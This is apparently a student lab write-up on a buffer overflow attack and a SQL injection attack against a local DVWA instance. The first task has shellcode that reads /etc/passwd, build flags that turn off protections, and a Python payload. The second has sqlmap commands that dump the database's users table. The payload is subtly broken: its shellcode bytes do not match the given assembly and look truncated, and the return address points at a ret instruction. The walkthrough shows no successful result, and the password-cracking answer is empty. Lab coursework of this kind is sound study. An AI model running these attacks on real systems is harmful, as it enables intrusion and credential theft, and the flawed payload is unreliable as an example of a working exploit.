# Lab #1,22110051, Tran Hoang Long, INSE331280E_02FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
- 
**Answer 1**: Must conform to below structure:

Description text (optional)

# Bước 1: Compile C program và shellcode

**Viết chương trình C vào file:** Tạo file vuln.c và dán đoạn mã C.

**Viết shellcode vào file:** Tạo file shellcode.asm và dán đoạn shellcode

**Biên dịch shellcode:** Sử dụng NASM và ld để biên dịch shellcode thành file thực thi:

```nasm -f elf32 shellcode.asm -o shellcode.o```

```ld -o shellcode shellcode.o```

**Biên dịch chương trình C:** Biên dịch file vuln.c bằng gcc:

```gcc -m32 -fno-stack-protector -z execstack vuln.c -o vuln```

output screenshot (optional)

![image](https://github.com/user-attachments/assets/636d5a4a-ed0a-4a39-9e9f-3a4551bce159)

# Bước 2: Thực hiện tấn công buffer overflow

**1.Xác định độ dài buffer:** Dùng gdb để kiểm tra vị trí stack cần để tấn công:

```gdb vuln```

```(gdb) run $(python -c 'print "A"*32')```

![image](https://github.com/user-attachments/assets/334ffd3b-1ae3-4db2-801d-2af499e6b092)

**Registers (Thanh ghi):**

```EAX, EBX:``` Hiện đang chứa giá trị ```0```.
```ECX:``` Chứa giá trị ```0x41414141```, là chuỗi các ký tự ```'AAAA'```. Điều này cho thấy có thể xảy ra buffer overflow, khi dữ liệu ```'AAAA'``` đã ghi đè lên các thanh ghi.

```EDX:``` Chứa giá trị ```0xffffd743```, với ```'A'``` được lặp lại nhiều lần.

```EBP:``` Chứa giá trị ```0x41414141```, cũng là ```'AAAA'```, có thể bị ghi đè do buffer overflow.

```ESP:``` Chứa giá trị ```0x4141413d```, là một địa chỉ không hợp lệ.

```EIP:``` Chỉ vào địa chỉ ```0x80484d5```, là lệnh ret, tức là chương trình đang chuẩn bị trả về từ một hàm nhưng không thể tiếp tục vì giá trị trong ```ESP``` không hợp lệ.

**Stack:**

Địa chỉ SP (Stack Pointer) chứa giá trị không hợp lệ ```0x4141413d```, dẫn đến lỗi.

**Code:**

Lệnh hiện tại là ```ret```, đang cố gắng trả về từ hàm ```main```, nhưng vì stack bị lỗi, chương trình không thể tiếp tục và dẫn đến lỗi truy cập bộ nhớ.

**2.Tạo payload và tấn công:** Bạn có thể sử dụng một script Python để chèn shellcode vào payload và thực hiện tấn công:

Chuyển đổi shellcode thành chuỗi byte
**Sử dụng objdump để chuyển đổi shellcode thành chuỗi byte:**

```objdump -d shellcode | grep '[0-9a-f]:' | awk '{print $2}' | tr '\n' ' ' | sed 's/ //g' | sed 's/\(..\)/\\x\1/g'```

![image](https://github.com/user-attachments/assets/075f2860-6167-41cd-906d-f5b6326625b9)

**Hãy sử dụng lệnh sau để tạo payload:**

![image](https://github.com/user-attachments/assets/3f5b1cb0-3999-4b1e-aab5-37f3a984bcc3)

```python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\xd5\x84\x04\x08" + b"\x90"*100 + b"\x31\xc0\x31\x51\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")' > payload```

```sys.stdout.buffer.write(...):``` Sử dụng sys.stdout.buffer.write() để ghi byte trực tiếp vào stdout mà không gặp vấn đề với mã hóa.

```b"...":``` Dùng tiền tố b để chỉ định rằng chuỗi này là một chuỗi byte, giúp Python biết rằng bạn đang làm việc với dữ liệu nhị phân.

```"A"*16:``` Ghi đè buffer với 16 ký tự "A".

```"\xd5\x84\x04\x08":``` Đây là địa chỉ EIP (0x80484d5) được chuyển đổi từ little-endian.

```"\x90"*100:``` NOP sled để giúp shellcode chạy dễ dàng hơn.

```"\x31\xc0\x31\x51\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80":```



**Conclusion**:  Đây là ví dụ điển hình của buffer overflow, khi chuỗi ký tự ```'AAAA'``` ghi đè lên các thanh ghi và bộ nhớ quan trọng, dẫn đến chương trình bị lỗi truy cập bộ nhớ (Segmentation Fault).




# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases

**Answer 1**:

1.Pull the DVWA Docker image

```docker pull vulnerables/web-dvwa```

```docker run -d -p 80:80 vulnerables/web-dvwa```

![image](https://github.com/user-attachments/assets/da3d5c1c-ee1c-40e5-a044-d565150f6a40)


2.Access DVWA Open a web browser and go to: http://localhost Log in with the default credentials:
Username: ```admin```

Password: ```password```

![image](https://github.com/user-attachments/assets/f5747201-262f-44fe-9d1e-7a2387727741)

3.Install SQLMap in 

```wsl sudo apt install sqlmap```

4.Fetch the url of webiste you want to attack

![image](https://github.com/user-attachments/assets/ee5a374e-0809-42bd-ae52-3b43a2febadc)

Enter any value for this to retun a url :http://localhost/vulnerabilities/sqli/?id=1

5.Get information about all available databases

```sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=l324b0sjbq4uo20kuc1s30s4p2; security=medium " --data="id=1&Submit=Submit" --dbs```
![image](https://github.com/user-attachments/assets/11946ebd-35e8-4cb1-94c2-bc56743ad03b)




**Question 2**: Use sqlmap to get tables, users information

**Answer 2**:
Choice Database is dvwa and Use sqlmap to get table
   
```sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=l324b0sjbq4uo20kuc1s30s4p2; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa --tables```
 ![image](https://github.com/user-attachments/assets/52c5896b-084e-48b7-99af-33855edff9fc)

 Choice Database is Users and use sqlmap to get users information
 
```sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=l324b0sjbq4uo20kuc1s30s4p2; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa -T users --dump```




**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit

**Answer 3**:



